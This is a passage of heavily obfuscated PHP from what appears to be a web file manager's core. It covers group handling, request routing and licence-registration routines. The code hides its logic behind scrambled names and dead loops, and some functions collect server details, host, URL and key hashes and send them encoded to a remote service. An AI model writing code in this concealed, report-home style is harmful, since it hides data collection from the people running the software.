!isset($ó†Ö—ˆù[$ºì×Àã[466]][$ºì×Àã[1922]]) || $ó†Ö—ˆù[$ºì×Àã[466]][$ºì×Àã[1922]] == $ºì×Àã[1891]) { return $this->groupShowRoot($Îì…‚Í»[count($Îì…‚Í») - 1], $ÄÔ§»èç); } if ($ó†Ö—ˆù[$ºì×Àã[466]][$ºì×Àã[1922]] == $ºì×Àã[357]) { $­À¼´Íó = explode($ºì×Àã[50], $ó†Ö—ˆù[$ºì×Àã[466]][$ºì×Àã[1923]]); if ($­À¼´Íó) { $Íšô¤¼ = array_merge($Íšô¤¼, $­À¼´Íó); } } return $Íšô¤¼; } protected function resetParentLevel() { $€ØšÁ…… =& $_SERVER[ñˆ‹ß¿÷]; $œ˜Úñ‹ = $€ØšÁ……[1836]; $Êè”Áå  = $this->select(); $Êè”Áå  = array_to_keyvalue($Êè”Áå , $œ˜Úñ‹); foreach ($Êè”Áå  as $œøõ¡¯’) { $Ùşó´â“ = $œøõ¡¯’; $¨Ãîçæ = array(); while ($Ùşó´â“[$€ØšÁ……[432]] != 0) { $¨Ãîçæ[] = $Ùşó´â“[$€ØšÁ……[432]]; $Ùşó´â“ = $Êè”Áå [$Ùşó´â“[$€ØšÁ……[432]]]; } $¨Ãîçæ[] = 0; $¨Ãîçæ = $€ØšÁ……[50] . implode($€ØšÁ……[50], array_reverse($¨Ãîçæ)) . $€ØšÁ……[50]; $this->setNamePinyin($œøõ¡¯’[$œ˜Úñ‹], $œøõ¡¯’[$€ØšÁ……[32]]); $this->where(array($œ˜Úñ‹ => $œøõ¡¯’[$œ˜Úñ‹]))->save(array($€ØšÁ……[590] => $¨Ãîçæ)); } return $Êè”Áå ; } public function groupNameAuto($îüÖ ı‚, $ëö½•) { $ÖÊ²ÀÒ¾ =& $_SERVER[ñˆ‹ß¿÷]; $å­²ˆøÁ = $this->where(array($ÖÊ²ÀÒ¾[401] => $îüÖ ı‚))->getField($ÖÊ²ÀÒ¾[32], !0); if (!$å­²ˆøÁ || !in_array($ëö½•, $å­²ˆøÁ)) { return $ëö½•; } for ($¬¥¥ÃàĞ = 1; $¬¥¥ÃàĞ <= count($å­²ˆøÁ) + 1; $¬¥¥ÃàĞ++) { $ï‘‡Åïö = $ëö½• . "\x28{$¬¥¥ÃàĞ}\x29"; if (!in_array($ï‘‡Åïö, $å­²ˆøÁ)) { return $ï‘‡Åïö; } } } public function groupSwitch($–«õü¤É, $“ğ›ò¼) { $Û°ØÉ®‰ =& $_SERVER[ñˆ‹ß¿÷]; $ŠØçşÙ = array($Û°ØÉ®‰[1836] => array($Û°ØÉ®‰[7], array($–«õü¤É, $“ğ›ò¼))); $Ê£ÜÏùù = $this->where($ŠØçşÙ)->select(); $Ê£ÜÏùù = array_to_keyvalue($Ê£ÜÏùù, $Û°ØÉ®‰[1836]); if (!isset($Ê£ÜÏùù[$–«õü¤É]) || !isset($Ê£ÜÏùù[$“ğ›ò¼]) || $Ê£ÜÏùù[$–«õü¤É][$Û°ØÉ®‰[432]] == 0) { return !1; } $ŠØçşÙ = array($Û°ØÉ®‰[1836] => $–«õü¤É); $™ğù¨Š¡ = Model($Û°ØÉ®‰[1926])->where($ŠØçşÙ)->select(); if (!$™ğù¨Š¡) { $™ğù¨Š¡ = array(); } foreach ($™ğù¨Š¡ as $Ã¨Š Õº) { $Ğ÷å±Ç = $Ã¨Š Õº[$Û°ØÉ®‰[1664]]; $ŠØçşÙ = array($Û°ØÉ®‰[1664] => $Ğ÷å±Ç, $Û°ØÉ®‰[1836] => $“ğ›ò¼); $ «ÆÑë = Model($Û°ØÉ®‰[1926])->where($ŠØçşÙ)->find(); if (!$ «ÆÑë) { $ˆÂ…Ø˜ = array($“ğ›ò¼ => $Ã¨Š Õº[$Û°ØÉ®‰[1940]]); Model($Û°ØÉ®‰[535])->userGroupAdd($Ğ÷å±Ç, $ˆÂ…Ø˜); } Model($Û°ØÉ®‰[535])->userGroupRemove($Ğ÷å±Ç, $–«õü¤É); } $ŠØçşÙ = array($Û°ØÉ®‰[411] => 2, $Û°ØÉ®‰[432] => 0, $Û°ØÉ®‰[410] => 1, $Û°ØÉ®‰[505] => array($Û°ØÉ®‰[7], array($–«õü¤É, $“ğ›ò¼))); $¦ïç‡±„ = Model($Û°ØÉ®‰[832])->where($ŠØçşÙ)->field($Û°ØÉ®‰[1941])->select(); $¦ïç‡±„ = array_to_keyvalue($¦ïç‡±„, $Û°ØÉ®‰[505], $Û°ØÉ®‰[402]); $åï­âõµ = !empty($¦ïç‡±„[$–«õü¤É]) ? $¦ïç‡±„[$–«õü¤É] : !1; if ($åï­âõµ) { if (!$¦ïç‡±„[$“ğ›ò¼]) { $¦ïç‡±„[$“ğ›ò¼] = Model($Û°ØÉ®‰[832])->groupRootAdd($“ğ›ò¼); } $Î§È²úà = $¦ïç‡±„[$“ğ›ò¼]; $ŠØçşÙ = array($Û°ØÉ®‰[432] => $åï­âõµ); $¦ïç‡±„ = Model($Û°ØÉ®‰[832])->where($ŠØçşÙ)->field($Û°ØÉ®‰[1942])->select(); if (!$¦ïç‡±„) { $¦ïç‡±„ = array(); } Model($Û°ØÉ®‰[832])->moveClearAuth = !1; foreach ($¦ïç‡±„ as $¹Å¥¸ç¤) { $¡¢şº¡‚ = $¹Å¥¸ç¤[$Û°ØÉ®‰[410]] == $Û°ØÉ®‰[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Û°ØÉ®‰[832])->move($¹Å¥¸ç¤[$Û°ØÉ®‰[402]], $Î§È²úà, $¡¢şº¡‚); } Model($Û°ØÉ®‰[832])->moveClearAuth = !0; $ŠØçşÙ = array($Û°ØÉ®‰[411] => 2, $Û°ØÉ®‰[505] => $–«õü¤É); $£Ì¿‚Ğ = array($Û°ØÉ®‰[505] => $“ğ›ò¼); Model($Û°ØÉ®‰[1943])->where($ŠØçşÙ)->save($£Ì¿‚Ğ); Model($Û°ØÉ®‰[1944])->where($ŠØçşÙ)->save($£Ì¿‚Ğ); } $this->_changeChildLevel($Ê£ÜÏùù[$–«õü¤É], $Ê£ÜÏùù[$“ğ›ò¼], !0); $this->where(array($Û°ØÉ®‰[432] => $–«õü¤É))->save(array($Û°ØÉ®‰[432] => $“ğ›ò¼)); $this->_clearChildrenCache($Ê£ÜÏùù[$“ğ›ò¼]); return !0; } } goto Cé¬ŞÀÒ…; D‚ƒé©‰Èù: class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($Ã‹´¼ë¼) { $ÊˆŞ…­ =& $_SERVER[ñˆ‹ß¿÷]; $í‰¾§Úı =& $_SERVER[ìõ½ó«ú]; $´Ï»——ş = explode($í‰¾§Úı[0], trim($Ã‹´¼ë¼, $í‰¾§Úı[0])); $øÖêÅùï = $ÊˆŞ…­[620]; if (!$øÖêÅùï) { return; } $this->defaultModule = $´Ï»——ş[0] ? $´Ï»——ş[0] : $this->defaultModule; $this->defaultController = $´Ï»——ş[1] ? $´Ï»——ş[1] : $this->defaultController; $¸åƒÛÆ± = $ÊˆŞ…­[621]; while ($¸åƒÛÆ± < $ÊˆŞ…­[615]) { if ($¸åƒÛÆ± >= 0) { break; } $¸åƒÛÆ±++; } $this->defaultAction = $´Ï»——ş[2] ? $´Ï»——ş[2] : $this->defaultAction; $this->eypdf3a06c3a($í‰¾§Úı[1], array($this, $í‰¾§Úı[2])); $òü£–Ãİ = $ÊˆŞ…­[622]; if (!$òü£–Ãİ) { die; } } public function appRun($ ËâÏÇİ) { $á‡£¢ğÉ =& $_SERVER[ñˆ‹ß¿÷]; $ğÏ®¨ı— =& $_SERVER[ìõ½ó«ú]; $š“Î£¢Ô = explode($ğÏ®¨ı—[0], $ ËâÏÇİ); $äÊ°§ÜÅ = strtolower($š“Î£¢Ô[0]); $­ì»âÍ = $ğÏ®¨ı—[3]; $°‹¯à“ = $á‡£¢ğÉ[623]; if (strlen($°‹¯à“) < $á‡£¢ğÉ[624]) { return; } if ($äÊ°§ÜÅ == $ğÏ®¨ı—[4]) { $­ì»âÍ = $ğÏ®¨ı—[5]; $š“Î£¢Ô[0] = $ğÏ®¨ı—[6]; $š“Î£¢Ô[1] = $š“Î£¢Ô[1] . $ğÏ®¨ı—[7]; $ ËâÏÇİ = join($ğÏ®¨ı—[0], $š“Î£¢Ô); $ ËâÏÇİ = trim($ ËâÏÇİ, $ğÏ®¨ı—[0]); } call_user_func(array($ğÏ®¨ı—[8], $ğÏ®¨ı—[9]), $­ì»âÍ . $ğÏ®¨ı—[10], $ ËâÏÇİ); ActionCall($ ËâÏÇİ); call_user_func(array($ğÏ®¨ı—[8], $ğÏ®¨ı—[9]), $­ì»âÍ . $ğÏ®¨ı—[11], $ ËâÏÇİ); $÷ÒîÀß = $á‡£¢ğÉ[625]; if (strlen($÷ÒîÀß) < $á‡£¢ğÉ[626]) { return; } } private function autorun() { $¿›Â =& $_SERVER[ìõ½ó«ú]; global $config; if (count($config[$¿›Â[12]]) == 0) { return; } foreach ($config[$¿›Â[12]] as $Ê÷¦ï½Í => $Æ«´Ğ¸Ñ) { $this->appRun($Æ«´Ğ¸Ñ); } } private function ijuq89e95e5c() { $ÉšÖíáª =& $_SERVER[ñˆ‹ß¿÷]; $ÒåœãÉ— =& $_SERVER[ìõ½ó«ú]; $¶–Ôˆ®š = $ÒåœãÉ—[4]; $Õª¯«„è = $ÉšÖíáª[627]; if (!$Õª¯«„è) { die; } $òÌ£¶™¦ = $GLOBALS[$ÒåœãÉ—[13]][$ÒåœãÉ—[14]][0]; $Ì‹™Â = $ÉšÖíáª[628]; if (!$òÌ£¶™¦ || strlen($òÌ£¶™¦) <= strlen($¶–Ôˆ®š)) { return; } if (strtolower(substr($òÌ£¶™¦, -strlen($¶–Ôˆ®š))) != $¶–Ôˆ®š) { return; } $é¾”†¹û = substr($òÌ£¶™¦, 0, -strlen($¶–Ôˆ®š)); $÷ÒŸÔ– = array($ÒåœãÉ—[4], $é¾”†¹û); $À—¶ñÆú = $ÉšÖíáª[629]; if (strlen($À—¶ñÆú) < $ÉšÖíáª[624]) { return; } $ãÙ€ëíè = array_slice($GLOBALS[$ÒåœãÉ—[13]][$ÒåœãÉ—[14]], 1); $³Î“¬±Û = $ÉšÖíáª[630]; $GLOBALS[$ÒåœãÉ—[13]][$ÒåœãÉ—[14]] = array_merge($÷ÒŸÔ–, $ãÙ€ëíè); $Àò™£äó = $ÉšÖíáª[631]; while (strlen($Àò™£äó) < $ÉšÖíáª[626]) { if (!$Àò™£äó) { break; } $Àò™£äó++; } $GLOBALS[$ÒåœãÉ—[13]][$ÒåœãÉ—[15]] = implode($ÒåœãÉ—[0], $GLOBALS[$ÒåœãÉ—[13]][$ÒåœãÉ—[14]]); $ó‚«½… = $ÉšÖíáª[632]; while (strlen($ó‚«½…) < $ÉšÖíáª[626]) { if (!$ó‚«½…) { break; } $ó‚«½…++; } } private function xiwo2b4f11ed() { $¢œÀ¤­ã =& $_SERVER[ñˆ‹ß¿÷]; $§Êè¢ÈÚ =& $_SERVER[ìõ½ó«ú]; if ($GLOBALS[$§Êè¢ÈÚ[13]][$§Êè¢ÈÚ[15]] != $§Êè¢ÈÚ[6]) { return; } $ı¢×‡¶é = $_SERVER[$§Êè¢ÈÚ[16]]; $¶ëµåĞ¼ = $§Êè¢ÈÚ[17]; $ıÍ©¬’ = $¢œÀ¤­ã[633]; if (!$ıÍ©¬’) { die; } if (!strstr($ı¢×‡¶é, $¶ëµåĞ¼)) { return; } $Ø¿´ù±› = strrpos($ı¢×‡¶é, $¶ëµåĞ¼); $½œÃÉ = substr($ı¢×‡¶é, $Ø¿´ù±› + strlen($¶ëµåĞ¼)); $×¥õÚ = $¢œÀ¤­ã[634]; while (strlen($×¥õÚ) < $¢œÀ¤­ã[635]) { if (!$×¥õÚ) { break; } $×¥õÚ++; } preg_match_all($§Êè¢ÈÚ[18], $½œÃÉ, $æ¾ù­·ã); $½œÃÉ = trim($æ¾ù­·ã[0][0], $§Êè¢ÈÚ[19]); $GLOBALS[$§Êè¢ÈÚ[13]][$§Êè¢ÈÚ[14]] = explode($§Êè¢ÈÚ[19], $½œÃÉ); $GLOBALS[$§Êè¢ÈÚ[13]][$§Êè¢ÈÚ[15]] = implode($§Êè¢ÈÚ[0], $GLOBALS[$§Êè¢ÈÚ[13]][$§Êè¢ÈÚ[14]]); $šÍò­ç° = $¢œÀ¤­ã[636]; if (strlen($šÍò­ç°) < $¢œÀ¤­ã[619]) { return; } } public function run() { $ìÓ‹›Ü =& $_SERVER[ñˆ‹ß¿÷]; $¾¹Æû¢ =& $_SERVER[ìõ½ó«ú]; $this->xiwo2b4f11ed(); $this->ijuq89e95e5c(); $ùâš¡â = $ìÓ‹›Ü[637]; $ªŸ¤¥œ¹ = $GLOBALS[$¾¹Æû¢[13]][$¾¹Æû¢[14]]; $¯ªæÀô¾ = $ìÓ‹›Ü[638]; if (!$¯ªæÀô¾) { return; } $çí¡‚Ù = $GLOBALS[$¾¹Æû¢[13]][$¾¹Æû¢[15]]; $†•ª˜ßö = $ìÓ‹›Ü[639]; define($¾¹Æû¢[20], isset($ªŸ¤¥œ¹[0]) && $ªŸ¤¥œ¹[0] ? $ªŸ¤¥œ¹[0] : $this->defaultModule); define($¾¹Æû¢[21], isset($ªŸ¤¥œ¹[1]) && $ªŸ¤¥œ¹[0] ? $ªŸ¤¥œ¹[1] : $this->defaultController); define($¾¹Æû¢[22], isset($ªŸ¤¥œ¹[2]) && $ªŸ¤¥œ¹[0] ? $ªŸ¤¥œ¹[2] : $this->defaultAction); $÷ˆ®ãçÕ = $ìÓ‹›Ü[640]; if (!$÷ˆ®ãçÕ) { die; } define($¾¹Æû¢[23], MOD . $¾¹Æû¢[0] . ST . $¾¹Æû¢[0] . ACT); $§èõ û€ = $ìÓ‹›Ü[641]; if (strlen($§èõ û€) < $ìÓ‹›Ü[624]) { return; } $_SERVER[$¾¹Æû¢[24]] = strtolower(ACTION); $this->autorun(); $÷İØÒ­ = $ìÓ‹›Ü[642]; if (strlen($÷İØÒ­) < $ìÓ‹›Ü[619]) { die; } if (count($ªŸ¤¥œ¹) >= 3) { $this->appRun($çí¡‚Ù); } else { $this->appRun(ACTION); } } private $garh1805068c = array(); private $rfyq03a91281 = ''; public function pvge67e69741() { $¢ñÄÎ®Á =& $_SERVER[ñˆ‹ß¿÷]; $†µªÚ“„ =& $_SERVER[ìõ½ó«ú]; $this->mpvi0802cb75(); $this->xhgj537f389f(); $this->aboz051fe6fd(); $îú®°ç¹ = $¢ñÄÎ®Á[643]; while (strlen($îú®°ç¹) < $¢ñÄÎ®Á[615]) { if (!$îú®°ç¹) { break; } $îú®°ç¹++; } $this->mhkn214348f3(); $this->qtkj55f4d818(); $this->shqvbb036328(); $ßÅ‡”Í‘ = $¢ñÄÎ®Á[644]; $this->ysnxd5746268(); $‰…ÊŠ® = $¢ñÄÎ®Á[645]; while ($‰…ÊŠ® < $¢ñÄÎ®Á[626]) { if ($‰…ÊŠ® >= 0) { break; } $‰…ÊŠ®++; } $this->eypdf3a06c3a($†µªÚ“„[25], array($this, $†µªÚ“„[26])); $äë©¹½ = $¢ñÄÎ®Á[646]; if (!$äë©¹½) { die; } $this->eypdf3a06c3a($†µªÚ“„[27], array($this, $†µªÚ“„[28])); $this->eypdf3a06c3a($†µªÚ“„[29], array($this, $†µªÚ“„[30])); $this->eypdf3a06c3a($†µªÚ“„[31], array($this, $†µªÚ“„[32])); $¾èŠ‚ ø = $¢ñÄÎ®Á[647]; while ($¾èŠ‚ ø < $¢ñÄÎ®Á[624]) { if ($¾èŠ‚ ø >= 0) { break; } $¾èŠ‚ ø++; } } public function dbra4bbba3b3($ŒËïéÂæ) { $Ùêƒûçó =& $_SERVER[ñˆ‹ß¿÷]; $ä©“êëú =& $_SERVER[ìõ½ó«ú]; $í°±íÑ = Model($ä©“êëú[33])->get(); $©õ¡êµ¸ = array($ä©“êëú[34], $ä©“êëú[35], $ä©“êëú[36], $ä©“êëú[37], $ä©“êëú[38], $ä©“êëú[39], $ä©“êëú[40], $ä©“êëú[41], $ä©“êëú[42], $ä©“êëú[43], $ä©“êëú[44], $ä©“êëú[45], $ä©“êëú[46], $ä©“êëú[47], $ä©“êëú[48], $ä©“êëú[49], $ä©“êëú[50], $ä©“êëú[51], $ä©“êëú[52], $ä©“êëú[53], $ä©“êëú[54], $ä©“êëú[55], $ä©“êëú[56], $ä©“êëú[57], $ä©“êëú[58], $ä©“êëú[59], $ä©“êëú[60], $ä©“êëú[61], $ä©“êëú[62], $ä©“êëú[63], $ä©“êëú[64], $ä©“êëú[65], $ä©“êëú[66], $ä©“êëú[67], $ä©“êëú[68], $ä©“êëú[69], $ä©“êëú[70], $ä©“êëú[71], $ä©“êëú[72], $ä©“êëú[73], $ä©“êëú[74], $ä©“êëú[75], $ä©“êëú[76], $ä©“êëú[77], $ä©“êëú[78], $ä©“êëú[79], $ä©“êëú[80], $ä©“êëú[81], $ä©“êëú[82], $ä©“êëú[83]); foreach ($©õ¡êµ¸ as $úåœ’¯) { $±çòä³® = $GLOBALS[$ä©“êëú[84]][$ä©“êëú[85]][$úåœ’¯]; if (isset($í°±íÑ[$úåœ’¯])) { $±çòä³® = $í°±íÑ[$úåœ’¯]; } $ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$úåœ’¯] = $±çòä³®; } $İïÂÖ± = $ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$ä©“êëú[46]]; $òúœóÃş = $Ùêƒûçó[648]; if (!$òúœóÃş) { die; } unset($ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[88]][$ä©“êëú[89]]); unset($ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[88]][$ä©“êëú[90]]); $«íçÂñ” = $Ùêƒûçó[649]; if (strlen($«íçÂñ”) < $Ùêƒûçó[635]) { return; } unset($ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$ä©“êëú[46]]); unset($ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$ä©“êëú[91]]); $ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$ä©“êëú[92]] = array($ä©“êëú[93] => (int) $İïÂÖ±[$ä©“êëú[94]], $ä©“êëú[95] => (int) _get($İïÂÖ±, $ä©“êëú[96], 0)); $ä†¢†æÌ = $Ùêƒûçó[650]; while (strlen($ä†¢†æÌ) < $Ùêƒûçó[635]) { if (!$ä†¢†æÌ) { break; } $ä†¢†æÌ++; } $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[98]] = Action($ä©“êëú[99])->accessToken(); $©®î©×¶ = $Ùêƒûçó[651]; while ($©®î©×¶ < $Ùêƒûçó[624]) { if ($©®î©×¶ >= 0) { break; } $©®î©×¶++; } $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[100]] = md5($_SERVER[$ä©“êëú[101]] . $í°±íÑ[$ä©“êëú[102]]); $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[103]] = base64_encode(serverInfo()); $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[104]] = $this->rfyq03a91281; $´‘’ÔÚ = $Ùêƒûçó[652]; while ($´‘’ÔÚ < $Ùêƒûçó[615]) { if ($´‘’ÔÚ >= 0) { break; } $´‘’ÔÚ++; } if ($í°±íÑ[$ä©“êëú[104]] != $ä©“êëú[105]) { $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[106]] = $í°±íÑ[$ä©“êëú[106]]; $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[107]] = $í°±íÑ[$ä©“êëú[107]]; $‡Å§èÖÑ = rand_string(10) . $this->rfyq03a91281 . rand_string(5); $ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[108]][$ä©“êëú[109]] = $this->djarf4d44748($‡Å§èÖÑ, $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[100]]); } if ($this->rfyq03a91281 == $ä©“êëú[105]) { $ŒËïéÂæ[$ä©“êëú[86]][$ä©“êëú[87]][$ä©“êëú[92]][$ä©“êëú[96]] = 0; } $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[110]] = _get($this->garh1805068c, $ä©“êëú[111], $ä©“êëú[6]); $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[112]] = _get($this->garh1805068c, $ä©“êëú[113], $ä©“êëú[6]); $Ó¦¥Ï± = $Ùêƒûçó[653]; if (_get($GLOBALS, $ä©“êëú[114]) && $this->config[$ä©“êëú[115]]) { $ŒËïéÂæ[$ä©“êëú[97]][$ä©“êëú[116]] = WEB_ROOT; } return $ŒËïéÂæ; } private function shqvbb036328() { $Ğìà‹ÜÄ =& $_SERVER[ñˆ‹ß¿÷]; $–è¹õ =& $_SERVER[ìõ½ó«ú]; $¨¨ƒÁ÷Ú = $_SERVER[$–è¹õ[24]] == $–è¹õ[117]; if ($_SERVER[$–è¹õ[24]] == $–è¹õ[118] && $_GET[$–è¹õ[119]] == $–è¹õ[120]) { $¨¨ƒÁ÷Ú = !0; } if ($¨¨ƒÁ÷Ú) { $ˆ… ±ô¬ = array($–è¹õ[104] => $this->rfyq03a91281, $–è¹õ[121] => $this->fcaq794271b2(), $–è¹õ[122] => Model($–è¹õ[123])->count()); if ($this->rfyq03a91281 != $–è¹õ[105]) { $¥Ö¢ëã = _get($this->garh1805068c, $–è¹õ[124]); if ($¥Ö¢ëã) { $ˆ… ±ô¬[$–è¹õ[125]] = $¥Ö¢ëã; $ˆ… ±ô¬[$–è¹õ[126]] = strtotime(_get($this->garh1805068c, $–è¹õ[127])); $ˆ… ±ô¬[$–è¹õ[128]] = _get($this->garh1805068c, $–è¹õ[113]); } $¨Ê‰×™â = Model($–è¹õ[33])->get($–è¹õ[129], $–è¹õ[6], !0); if (is_string($¨Ê‰×™â) && substr($¨Ê‰×™â, 0, 1) == $–è¹õ[130]) { $¨Ê‰×™â = json_decode_force($¨Ê‰×™â); } if (is_array($¨Ê‰×™â) && $¨Ê‰×™â[$–è¹õ[131]] && strstr($¨Ê‰×™â[$–è¹õ[131]], $–è¹õ[132])) { $œğüîÂ€ = explode($–è¹õ[132], $¨Ê‰×™â[$–è¹õ[131]]); $ˆ… ±ô¬[$–è¹õ[133]] = $œğüîÂ€[0]; } } $ˆ… ±ô¬ = $this->hnpt5bb6ae11(json_encode($ˆ… ±ô¬), md5($–è¹õ[134])); $–›ÑÅÌ‹ = $Ğìà‹ÜÄ[654]; if (strlen($–›ÑÅÌ‹) < $Ğìà‹ÜÄ[624]) { die; } $ÏöŸğ²£ = array($–è¹õ[135] => $ˆ… ±ô¬); $û´­É = $Ğìà‹ÜÄ[655]; while (strlen($û´­É) < $Ğìà‹ÜÄ[619]) { if (!$û´­É) { break; } $û´­É++; } call_user_func(array($–è¹õ[136], $–è¹õ[137]), $ÏöŸğ²£); } if ($this->rfyq03a91281 == $–è¹õ[105]) { return; } $¿Çø³–ô = array($–è¹õ[138], $–è¹õ[139], $–è¹õ[140], $–è¹õ[141], $–è¹õ[142], $–è¹õ[143]); $–Ò™€É = $Ğìà‹ÜÄ[656]; if (strlen($–Ò™€É) < $Ğìà‹ÜÄ[635]) { return; } $ˆÌ¨ì€™ = Model($–è¹õ[33])->get(); $ÏöŸğ²£ = array($–è¹õ[144] => $ˆÌ¨ì€™[$–è¹õ[34]], $–è¹õ[145] => $ˆÌ¨ì€™[$–è¹õ[35]], $–è¹õ[146] => $–è¹õ[6]); $³øÛ¿·ç = $Ğìà‹ÜÄ[657]; foreach ($¿Çø³–ô as $ÎƒŒñ¿») { if (!isset($ˆÌ¨ì€™[$ÎƒŒñ¿»]) || !$ˆÌ¨ì€™[$ÎƒŒñ¿»]) { continue; } $ÏöŸğ²£[$ÎƒŒñ¿»] = $ˆÌ¨ì€™[$ÎƒŒñ¿»]; $âæÃÏÏí = $Ğìà‹ÜÄ[658]; if (!$âæÃÏÏí) { die; } } call_user_func(array($–è¹õ[136], $–è¹õ[137]), $ÏöŸğ²£); $«ó’šê = $Ğìà‹ÜÄ[659]; while (strlen($«ó’šê) < $Ğìà‹ÜÄ[619]) { if (!$«ó’šê) { break; } $«ó’šê++; } } private function mhkn214348f3() { $áø‰½ƒ‡ =& $_SERVER[ñˆ‹ß¿÷]; $üŞíŒ¬Å =& $_SERVER[ìõ½ó«ú]; if ($_SERVER[$üŞíŒ¬Å[24]] != $üŞíŒ¬Å[147]) { return; } if (!_get($GLOBALS, $üŞíŒ¬Å[114])) { die; } $¨ÅŒŞ†Á = $GLOBALS[$üŞíŒ¬Å[13]]; if (isset($¨ÅŒŞ†Á[$üŞíŒ¬Å[148]])) { $this->cvsnc5d14ea8(); die; } if (!isset($¨ÅŒŞ†Á[$üŞíŒ¬Å[149]]) || strlen($¨ÅŒŞ†Á[$üŞíŒ¬Å[149]]) != 16) { show_json($üŞíŒ¬Å[150] . $¨ÅŒŞ†Á[$üŞíŒ¬Å[149]], !1); } $š€ìÖ°¦ = Model($üŞíŒ¬Å[33])->get($üŞíŒ¬Å[102]); $ş¡½ˆïØ = md5($_SERVER[$üŞíŒ¬Å[101]] . $š€ìÖ°¦); $¶ªÕêµî = $áø‰½ƒ‡[660]; while ($¶ªÕêµî < $áø‰½ƒ‡[635]) { if ($¶ªÕêµî >= 0) { break; } $¶ªÕêµî++; } $¹º•ƒÔ = array($üŞíŒ¬Å[149] => $¨ÅŒŞ†Á[$üŞíŒ¬Å[149]], $üŞíŒ¬Å[151] => rand_string(16), $üŞíŒ¬Å[152] => $üŞíŒ¬Å[134], $üŞíŒ¬Å[153] => $üŞíŒ¬Å[154], $üŞíŒ¬Å[155] => $_SERVER[$üŞíŒ¬Å[156]], $üŞíŒ¬Å[157] => $_SERVER[$üŞíŒ¬Å[158]], $üŞíŒ¬Å[159] => $_SERVER[$üŞíŒ¬Å[160]], $üŞíŒ¬Å[100] => $ş¡½ˆïØ, $üŞíŒ¬Å[161] => Model($üŞíŒ¬Å[33])->get($üŞíŒ¬Å[129])); $ºÊ¨Î‡˜ = $áø‰½ƒ‡[661]; if ($¨ÅŒŞ†Á[$üŞíŒ¬Å[162]] == $üŞíŒ¬Å[163]) { $ŠÙş–ª = $this->hnpt5bb6ae11($ş¡½ˆïØ, $üŞíŒ¬Å[164]); $ŠÎÍ÷ìç = $this->djarf4d44748(json_encode($¹º•ƒÔ), $ş¡½ˆïØ . $üŞíŒ¬Å[165], 3); $ŠÎÍ÷ìç = $ŠÎÍ÷ìç . $üŞíŒ¬Å[166] . $_SERVER[$üŞíŒ¬Å[156]]; $´î±Ö¸½ = $this->udyvf718036e($üŞíŒ¬Å[167] . $ŠÙş–ª . $üŞíŒ¬Å[168] . $ŠÎÍ÷ìç, -1); show_json($´î±Ö¸½, !0); } else { if ($¨ÅŒŞ†Á[$üŞíŒ¬Å[162]] == $üŞíŒ¬Å[169]) { $ãÔÌ¢•Œ = substr(md5($üŞíŒ¬Å[170] . $ş¡½ˆïØ), 12, 15) . $üŞíŒ¬Å[171]; $ŠÎÍ÷ìç = $this->rpmo0d9f576f(trim($¨ÅŒŞ†Á[$üŞíŒ¬Å[172]]), $ãÔÌ¢•Œ, 2); $‹¢¬µ·ë = json_decode($ŠÎÍ÷ìç, !0); if (!is_array($‹¢¬µ·ë) || !is_array($‹¢¬µ·ë[$üŞíŒ¬Å[173]]) || $‹¢¬µ·ë[$üŞíŒ¬Å[149]] != !0) { $†ƒèóöÊ = $üŞíŒ¬Å[174]; $³„¦È‚® = $‹¢¬µ·ë[$üŞíŒ¬Å[173]] ? $üŞíŒ¬Å[175] . $‹¢¬µ·ë[$üŞíŒ¬Å[173]] : $†ƒèóöÊ; show_json($³„¦È‚®, !1); } else { $¹º•ƒÔ[$üŞíŒ¬Å[151]] = $‹¢¬µ·ë[$üŞíŒ¬Å[173]][$üŞíŒ¬Å[176]]; } } else { $‹¢¬µ·ë = $this->udyvf718036e($üŞíŒ¬Å[177], $¹º•ƒÔ, 10); $Ñ«ä¯ÓÅ = $áø‰½ƒ‡[662]; if (strlen($Ñ«ä¯ÓÅ) < $áø‰½ƒ‡[615]) { return; } } } if (!is_array($‹¢¬µ·ë) || !is_array($‹¢¬µ·ë[$üŞíŒ¬Å[173]]) || $‹¢¬µ·ë[$üŞíŒ¬Å[149]] != !0) { $†ƒèóöÊ = LNG($üŞíŒ¬Å[178]); $³„¦È‚® = $‹¢¬µ·ë[$üŞíŒ¬Å[173]] ? $üŞíŒ¬Å[175] . $‹¢¬µ·ë[$üŞíŒ¬Å[173]] : $†ƒèóöÊ; show_json($³„¦È‚®, !1); } $¯î…€…„ = $‹¢¬µ·ë[$üŞíŒ¬Å[173]]; $À‡ñó×á = $this->srpo83e73180($¯î…€…„[$üŞíŒ¬Å[179]]); if (!$À‡ñó×á || $À‡ñó×á != $¯î…€…„[$üŞíŒ¬Å[127]]) { $Ó¦÷‡ = array($üŞíŒ¬Å[180] => Model($üŞíŒ¬Å[33])->get($üŞíŒ¬Å[102]), $üŞíŒ¬Å[181] => $_SERVER[$üŞíŒ¬Å[101]], $üŞíŒ¬Å[182] => this_url(), $üŞíŒ¬Å[157] => $_SERVER[$üŞíŒ¬Å[158]]); $ŠÎÍ÷ìç = $this->hbtwd84ac7ba(json_encode($Ó¦÷‡)); $this->udyvf718036e($üŞíŒ¬Å[183] . $ŠÎÍ÷ìç); show_json(LNG($üŞíŒ¬Å[184]), !0); } $ëÍ±€Ï = array($üŞíŒ¬Å[185] => $¯î…€…„[$üŞíŒ¬Å[186]], $üŞíŒ¬Å[187] => $¯î…€…„[$üŞíŒ¬Å[188]], 